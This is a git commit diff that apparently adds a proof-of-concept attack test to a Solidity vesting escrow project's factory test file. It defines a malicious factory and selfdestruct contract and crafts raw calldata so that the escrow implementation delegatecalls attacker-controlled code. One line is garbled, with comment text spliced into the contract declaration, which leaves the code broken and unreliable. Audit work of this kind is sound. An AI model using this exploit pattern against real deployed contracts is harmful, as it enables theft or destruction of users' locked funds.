1d66bf8ffb113866fa5f427d17e5b618bc0b4617
0xjoichiro <joichiro.sai@gmail.com>
2024-07-11 17:56:24 +0530

    Test case added for attack

--- rio-vesting-escrow/test/VestingEscrowFactory.t.sol
+++ rio-vesting-escrow/test/VestingEscrowFactory.t.sol
@@ -3,10 +3,26 @@ pragma solidity 0.8.23;
 
 import {TestUtil} from 'test/lib/TestUtil.sol';
 import {ERC20Token} from 'test/lib/ERC20Token.sol';
+import {console2 as console} from 'forge-std/Test.sol';
 
-contract VestingEscrowFactoryTest is TestUtil {
-    function setUp() public {
-        setUpProtocol(ProtocolConfig({owner: address(1), manager: address(2)}));
+contract SelfDestruct {
+    function delegate(bytes memory params) public {
+        //selfdestruct call: in foundry is not possible to show the effects of `selfdestruct` because the results only take effect when a call is done.
+    }
+}
+
+contract MaliciousFactory {
+    address sd;
+    constructor() {
+        sd = address(new SelfDestruct());
+    }
+    function votingAdaptor() public returns (address) {
+        return address(sd);
+    }
+}
+
+
+contract VestingEscrowFactoryTest is TestUtil {actually calls the malicious voting adapter's function that executes selfdestruct().{owner: address(1), manager: address(2)}));
         deployVestingEscrow(
             VestingEscrowConfig({
                 amount: 1 ether,
@@ -67,4 +83,33 @@ contract VestingEscrowFactoryTest is TestUtil {
         vm.expectRevert();
         factory.changeManager(address(1));
     }
+
+    function testArbitraryDelegateCall() public {
+    address maliciousFactory = address(new MaliciousFactory());
+    address vestingEscrowImpl = factory.vestingEscrowImpl();
+
+    address attacker = makeAddr("attacker");
+
+    bytes memory craftedCalldata = abi.encodePacked(
+
+        //CALLDATA FOR FUNCTION `delegate(bytes)`
+        hex"0ccfac9e", //fn selector of `delegate(bytes)`
+        hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000", //`bytes params of delegate(bytes)`
+        
+        //MALICIOUS CALLDATA
+        address(maliciousFactory), //address: malicious factory
+        hex"0000000000000000000000000000000000000000", //address: OZVotingToken address
+        address(attacker), //address: recipient
+        hex"0000000000", //uint40: starttime
+        hex"0000000000", //uint40: endttime
+        hex"0000000000", //uint40: cliffLength
+        hex"0000000000000000000000000000000000000000000000000000000000000000", //uint256: totalLocked
+        hex"006d" //2 bytes for data length
+
+    );
+
+    vm.prank(attacker);
+    (bool success, bytes memory data) = vestingEscrowImpl.call(craftedCalldata);
+    require(success);
+}
 }
